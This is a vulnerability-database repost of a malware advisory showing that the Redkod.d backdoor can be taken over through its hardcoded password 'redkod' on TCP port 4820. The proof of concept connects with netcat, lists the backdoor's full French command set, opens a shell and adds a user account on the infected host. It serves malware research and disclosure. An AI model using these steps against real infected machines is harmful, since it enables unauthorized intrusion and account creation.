---
title: Backdoor.Win32.Redkod.d / Weak Hardcoded Credentials
url: https://cxsecurity.com/issue/WLB-2022100040
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-18
fetch_date: 2025-10-03T20:03:50.024292
---

# Backdoor.Win32.Redkod.d / Weak Hardcoded Credentials

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Backdoor.Win32.Redkod.d / Weak Hardcoded Credentials**  **2022.10.17**  **![us](https://cert.cx/cxstatic/images/flags/us.png) [malvuln](https://cxsecurity.com/author/malvuln/1/) **(US)** ![us](https://cert.cx/cxstatic/images/flags/us.png)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **N/A** | |

Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2022
Original source: https://malvuln.com/advisory/bb309bdd071d5733efefe940a89fcbe8.txt
Contact: malvuln13@gmail.com
Media: twitter.com/malvuln
Threat: Backdoor.Win32.Redkod.d
Vulnerability: Weak Hardcoded Credentials
Description: The malware listens on TCP port 4820. Authentication is required, however the password "redkod" is weak and hardcoded in cleartext within the PE file.
Family: Redkod
Type: PE32
MD5: bb309bdd071d5733efefe940a89fcbe8
Vuln ID: MVID-2022-0649
Disclosure: 10/16/2022
Exploit/PoC:
C:\>nc64.exe x.x.x.x 4820
===========================================================
= RedKod Backdoor 1.0 =
= By R-e-D =
= http://www.redkod.com =
= r-e-d@redkod.com =
===========================================================
Password: redkod
RBackdoor# exec calc
msg: Execution effectuee avec succes
RBackdoor# setpass malvuln
RBackdoor# help
COMMAND HELP:
> Shell Commands :
CD Permet de changer de repertoire courant
CLEAR Efface le buffer de la console
COPY Permet de copier un fichier
DEL Permet d'effacer un ou plusieurs fichier
DIR Permet de lister le contenu d'un repertoire
FIND Recherche un fichier a travers le path
HELP Affiche cette aide
LS Permet de lister le contenu d'un repertoire
MD Permet de creer un repertoire
MOVE Permet de deplacer un fichier ou un repertoire
REN Permet de renommer un fichier
PWD Permet de recuperer le repertoire courant
RMDIR Permet d'effacer un repertoire
SHELL Permet d'executer toute commande DOS sur le systeme cible
> Informations Commands :
CLIP Permet de recuperer le contenu du presse papier
DISKINFO Permet de recuperer des informations sur les disques durs
GETGROUPS Permet de recuperer des informations sur les groupes, les users, les SID :)
GETPROCESS Recupere et affiche la liste des processus actifs
GETSERVICES Permet d'afficher les services NT presents sur une machine local ou distante
LISTEVENT Permet de lister les journaux du eventlog
NETSHARE Permer d'afficher les ressources partager de la machine local ou d'u ne machine distante
ENUMSERVER Permet d'afficher les servers appartenant au domaine
SYSINFO Permet de recuperer des informations sur le systeme cible
TIME Affiche l'heure et la date du systeme distant
UPTIME Permet d'afficher depuis combien de temps le systeme fonctionne
USERINFO Permet d'obtenir des informations sur un utilisateur
VERSION Affiche la version de RBackdoor
WHOAMI Permet de recuperer l'utilisateur logge sur la machine
> Interactions Commands :
ADDEVENT Permet d'ajouter un evenement dans l'eventlog
ADDSHARE Permet d'ajouter une ressource partagee
BEEP Fait beeper le haut parleur interne
CLEARLOG Permet d'effacer un journal complet de l'eventlog
DELSERVICE Permet de supprimer un service present
DELSHARE Permet de retirer une ressource partagee
EXEC Permet d'executer une commande sur le systeme cible
HEXEC Permet d'executer une commande tout en cachant sa sortie
LOGOFF Permet de fermer la session de l'utilisateur courant
KILLPROCESS Permet de killer un processus
MOUSE Permet de placer le curseur de la souris au coordonnees x et y voulues
MSGBOX Permet d'envoyer une boite de dialogue au systeme cible avec message personalise
RCHAT Permet d'etablir une communication ecrite avec une personne etant pr esent sur le pc distant
REBOOT Permet de redemarrer la machine
SCREENSHOT Permet de prendre un screenshot du bureau de la machine distante
SENDKEY Permet d'emuler la pression d'une touche du clavier
SETNAME Change le nom NetBios du serveur
STARTSERVICE Permet de demarrer un servive present sur la machine serveur
STOPSERVICE Permet de stopper un service present et demarrer
> Administration of RBackdoor Commands :
EXIT Permet de fermer la connection a la backdoor tout en laissant la backdoor active
KILL Permet de desactiver ou de reactiver la backdoor
OPEN Creer un nouveau processus de RBackdoor sur un autre port
SETPASS Permet de modifier le pass associe a la backdoor
> RBackdoor Tools :
FGET Permet de recuperer un fichier sur un serveur FTP
FPUT Permet d'uploader un fichier sur un serveur FTP
MAIL Permet d'envoyer un mail, etc...
NETPATCH Rootkit permettant de patcher netstat.exe pour cacher RBackdoor
RCRYPT Permet de crypter ou de decrypter un fichier
RPATCH Permet de patcher le systeme pour effacer rbackdoor
RSHELL Permet de lancer un vrai shell DOS
SCAN Permet de scanner les ports d'une hote distante
TELNET Permet de se connecter a une hote distante (TCP Protocol Only)
VIEW Permet de lire le contenu d'un fichier
WGET Recupere et d'affiche le contenu d'un fichier heberge sur un serveur http
WRITE Permet d'ecrire directement dans un fichier
msg: Tapez help <command> pour des informations plus precises sur la commande voulue
RBackdoor# rshell
ATTENTION!!
Pour fermer le shell veuillez tapez 'exit'! Sinon perte de la backdoor envisageable !
Microsoft Windows [Version 10.0.16299.309]
(c) 2017 Microsoft Corporation. All rights reserved.
C:\dump>whoami
whoami
desktop-2c4jqho\victim
C:\dump>net user hyp3rlinx 666 /add
net user hyp3rlinx 666 /add
The command completed successfully.
Disclaimer: The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or ex...